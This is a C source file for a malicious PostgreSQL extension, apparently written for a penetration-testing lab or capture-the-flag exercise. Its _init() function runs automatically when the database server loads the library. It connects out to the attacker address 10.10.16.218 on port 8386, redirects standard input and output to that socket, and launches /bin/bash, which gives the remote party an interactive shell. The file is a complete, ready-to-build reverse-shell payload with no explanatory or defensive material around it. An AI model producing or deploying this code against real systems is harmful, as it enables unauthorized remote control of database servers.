 #include <stdio.h>
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include "postgres.h"
 #include "fmgr.h"
    
 #ifdef PG_MODULE_MAGIC
 PG_MODULE_MAGIC;
 #endif
    
 void _init() {
     /*
         code taken from https://www.revshells.com/
     */
    
     int port = 8386; // port attack
     struct sockaddr_in revsockaddr;
    
     int sockt = socket(AF_INET, SOCK_STREAM, 0);
     revsockaddr.sin_family = AF_INET;       
     revsockaddr.sin_port = htons(port);
     revsockaddr.sin_addr.s_addr = inet_addr("10.10.16.218");  // ip attackattack
    
     connect(sockt, (struct sockaddr *) &revsockaddr, 
     sizeof(revsockaddr));
     dup2(sockt, 0);
     dup2(sockt, 1);
     dup2(sockt, 2);
    
     char * const argv[] = {"/bin/bash", NULL};
     execve("/bin/bash", argv, NULL);
 }
